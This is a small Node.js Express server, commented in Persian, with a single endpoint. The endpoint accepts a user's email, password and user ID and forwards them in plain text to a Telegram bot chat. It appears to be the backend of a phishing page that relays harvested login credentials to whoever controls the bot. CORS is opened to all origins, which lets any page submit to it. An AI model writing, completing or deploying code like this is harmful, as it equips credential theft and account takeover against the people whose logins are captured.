const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = 3000;

app.use(express.json()); // برای پردازش داده‌های JSON در درخواست‌ها

// توکن ربات تلگرام و شناسه چت
const telegramToken = 'YOUR_BOT_TOKEN';
const chatId = 'YOUR_CHAT_ID';

// ارسال پیام به تلگرام
const sendMessageToTelegram = (message) => {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message,
    };

    return fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
        .then((response) => response.json())
        .catch((error) => console.error('Error:', error));
};

// تعریف مسیر برای دریافت داده‌ها
app.post('/send-message', (req, res) => {
    const { email, password, userId } = req.body;

    if (!email || !password || !userId) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    const message = `اطلاعات کاربر:
    ایمیل: ${email}
    پسورد: ${password}
    یو آیدی: ${userId}`;

    sendMessageToTelegram(message)
        .then(() => {
            res.status(200).json({ success: 'Message sent to Telegram' });
        })
        .catch((error) => {
            res.status(500).json({ error: 'Failed to send message to Telegram' });
        });
});

// راه‌اندازی سرور
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
const cors = require('cors');
app.use(cors());
